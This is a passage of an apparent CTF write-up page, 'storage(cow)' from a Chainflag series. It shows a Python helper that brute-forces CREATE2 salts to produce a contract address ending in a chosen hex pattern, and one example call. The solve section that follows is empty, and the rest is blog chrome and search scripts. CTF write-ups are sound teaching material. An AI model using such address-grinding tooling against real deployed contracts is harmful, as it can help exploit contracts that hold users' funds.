Web3.keccak(hexstr=s)</span><br><span class="line">                address = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])[<span class="number">24</span>:]</span><br><span class="line">                <span class="keyword">if</span> potision == <span class="number">0</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:<span class="subst">&#123;potision+<span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> potision &gt; <span class="number">0</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:potision+<span class="built_in">len</span>(content)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:<span class="subst">&#123;potision+<span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> potision &lt; <span class="number">0</span> <span class="keyword">and</span> potision != -<span class="number">4</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:potision + <span class="built_in">len</span>(content)]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:<span class="subst">&#123;potision + <span class="built_in">len</span>(content)&#125;</span>) \n[address] 0x<span class="subst">&#123;address&#125;</span>\n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">elif</span> potision == -<span class="number">4</span> <span class="keyword">and</span> content <span class="keyword">in</span> address[potision:]:</span><br><span class="line">                    logger.success(</span><br><span class="line">                        <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2]\n[content] <span class="subst">&#123;content&#125;</span> \n[salt] 0x<span class="subst">&#123;salt&#125;</span> \n[position] [<span class="subst">&#123;potision&#125;</span>:-1] \n[address] 0x<span class="subst">&#123;address&#125;</span> \n<span class="subst">&#123;<span class="string">&#x27;-&#x27;</span> * <span class="number">80</span>&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + salt, <span class="string">&quot;0x&quot;</span> + address</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            ExceptionInformation = format_exc()</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">f&quot;\n[BlockchainUtils][GetSpecialAddressByCreate2] Failed\n[content] <span class="subst">&#123;content&#125;</span>\n <span class="subst">&#123;ExceptionInformation&#125;</span><span class="subst">&#123;<span class="string">&#x27;-&#x27;</span>*<span class="number">80</span>&#125;</span>&quot;</span></span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BlockchainUtils.GetSpecialAddressByCreate2(<span class="string">&#x27;d8b934580fcE35a11B58C6D73aDeE468a2833fa8&#x27;</span>,<span class="string">&#x27;05810939c4d8e77c7017e7d39d35a9daf5ae7ced61ab83230b39e90ea4b95123&#x27;</span>,<span class="string">&#x27;525b&#x27;</span>,-<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2>
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/06/29/02.Chainflag%20%20CTF/10.air-hunting(babybet)/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-06-29 15:14:22
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/02-chainflag-ctf/" title="02.chainflag ctf">
+                        <b>#</b> 02.chainflag ctf
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/06/29/02.Chainflag%20%20CTF/12.storage(bank)/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#storage-cow"><span class="toc-text">storage(cow)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#contract"><span class="toc-text">contract</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#analyses"><span class="toc-text">analyses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solve"><span class="toc-text">solve</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 11.storage(cow) + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F06%2F29%2F02.Chainflag%2520%2520CTF%2F11.storage(cow)%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/06/29/02.Chainflag%20%20CTF/11.storage(cow)/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
